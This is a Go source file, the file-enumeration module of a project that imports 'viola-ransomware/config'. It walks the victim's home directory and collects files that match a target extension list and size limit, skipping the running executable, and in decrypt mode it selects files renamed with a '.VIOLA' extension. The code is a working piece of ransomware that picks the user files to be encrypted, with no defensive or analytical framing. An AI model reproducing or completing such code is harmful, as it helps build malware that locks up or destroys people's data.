package enumeration

import (
	"os"
	"path/filepath"
	"viola-ransomware/config"
)

var (
	extEncrypt = config.ExtForEncrypt
	sizeMB     = int64(config.MaxSize) * 1024 * 1024 // MB to bytes
)

// get home directory
func SearchHomeFolder() (string, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return homeDir, nil

}

// check file size
func CheckFileSize(path string) (bool, error) {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false, err
	}

	if fileInfo.Size() <= sizeMB {
		return true, nil
	}

	return false, nil
}

// check if extensions in array
func isExtensionsInList(extension string, decrypt bool) bool {
	if decrypt {
		extEncrypt = []string{".VIOLA"}
	}

	for _, ext := range extEncrypt {
		if ext == extension {
			return true
		}
	}
	return false
}

func CheckPathScriptRunning() string {
	ex, err := os.Executable()
	if err != nil {
		panic(err.Error())
	}

	return ex
}

func DirectoryEnumeration(decrypt bool) ([]string, error) {
	var files []string

	homeDir, err := SearchHomeFolder()
	if err != nil {
		return nil, err
	}

	scriptRunning := CheckPathScriptRunning()

	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if !info.IsDir() {
			ext := filepath.Ext(path)
			fileSizeOk, err := CheckFileSize(path)
			if err != nil {
				return nil
			}
			if isExtensionsInList(ext, decrypt) && fileSizeOk && path != scriptRunning {
				files = append(files, path)
			}
		}
		return nil
	})

	if err != nil {
		return nil, err
	}

	return files, nil
}
